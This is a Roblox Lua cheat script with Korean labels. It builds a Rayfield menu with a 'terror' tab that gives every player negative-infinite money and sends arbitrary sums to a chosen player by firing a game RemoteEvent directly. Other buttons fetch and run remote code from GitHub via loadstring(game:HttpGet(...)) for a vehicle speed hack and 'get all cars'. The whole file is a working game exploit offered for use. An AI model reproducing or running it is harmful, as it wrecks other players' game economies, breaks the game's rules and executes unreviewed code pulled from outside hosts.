local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "폭주입니다노",
   LoadingTitle = "재밌노 이기야",
   LoadingSubtitle = "by nosamo",
   Theme = "Default",
   ToggleUIKeybind = "K",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil,
      FileName = "강서구 허브"
   },
   Discord = {
      Enabled = false,
      Invite = "noinvitelink",
      RememberJoins = true
   },
   KeySystem = false,
})

local MainTab = Window:CreateTab("💥 테러", nil)
local MainSection = MainTab:CreateSection("돈 테러")

Rayfield:Notify({
   Title = "실행 성공",
   Content = "재밌냐?",
   Duration = 0.5,
})


MainTab:CreateButton({
   Name = "🤣 모두에게 -inf 돈 주기",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/gangwe222/-/refs/heads/main/new%20%20%22%ED%8F%AD%EC%A3%BC%22%20-%20inf"))()
   end,
})


local selectedPlayerName = nil
local selectedAmount = 0

local function getPlayerNames()
	local names = {}
	for _, player in ipairs(game.Players:GetPlayers()) do
		if player ~= game.Players.LocalPlayer then
			table.insert(names, player.Name)
		end
	end
	return names
end

local function createPlayerDropdown()
	return MainTab:CreateDropdown({
		Name = "👥 플레이어 선택",
		Options = getPlayerNames(),
		CurrentOption = nil,
		Callback = function(option)
			if typeof(option) == "table" then
				selectedPlayerName = tostring(option[1])
			else
				selectedPlayerName = tostring(option)
			end
		end
	})
end

local PlayerDropdown = createPlayerDropdown()

MainTab:CreateButton({
	Name = "🔄 플레이어 목록 새로고침",
	Callback = function()
		PlayerDropdown = createPlayerDropdown()
		Rayfield:Notify({
			Title = "✅ 새로고침 완료",
			Content = "플레이어 목록이 갱신되었습니다.",
			Duration = 2
		})
	end
})

MainTab:CreateInput({
	Name = "💰 줄 돈의 양",
	PlaceholderText = "",
	RemoveTextAfterFocusLost = false,
	Callback = function(text)
		selectedAmount = tonumber(text) or 0
	end
})

MainTab:CreateButton({
	Name = "🚀 돈 주기 실행",
	Callback = function()
		if not selectedPlayerName or selectedPlayerName == "" or selectedAmount == 0 then
			Rayfield:Notify({
				Title = "❌ 오류",
				Content = "플레이어와 금액을 올바르게 선택하세요.",
				Duration = 3
			})
			return
		end

		local args = {
			selectedPlayerName,             -- 수신자 이름 (문자열)
			tostring(selectedAmount),       -- 금액 (문자열)
			""                              -- 메시지 또는 빈 문자열
		}

		game:GetService("Players").LocalPlayer
			:WaitForChild("PlayerGui")
			:WaitForChild("up1_new1_moneysend2022_BudungStudio. (StarterGui)")
			:WaitForChild("sell")
			:WaitForChild("sell")
			:WaitForChild("RemoteEvent"):FireServer(unpack(args))

		Rayfield:Notify({
			Title = "✅ 완료",
			Content = selectedPlayerName .. "에게 " .. tostring(selectedAmount) .. "원 줌",
			Duration = 3
		})
	end
})


local MiscTab = Window:CreateTab("다른기능", nil)
local MiscSection = MiscTab:CreateSection("1")

local Button = MiscTab:CreateButton({
   Name = "자동차 속도핵",
   Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Documantation12/Universal-Vehicle-Script/main/Main.lua'))()
   end,
})

local Button = MiscTab:CreateButton({
   Name = "모든차 얻기노 ㅋ",
   Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/gangwe222/-/refs/heads/main/%22%ED%8F%AD%EC%A3%BC%22%20%EB%AA%A8%EB%93%A0%EC%B0%A8%EC%96%BB%EA%B8%B0'))()
   end,
})
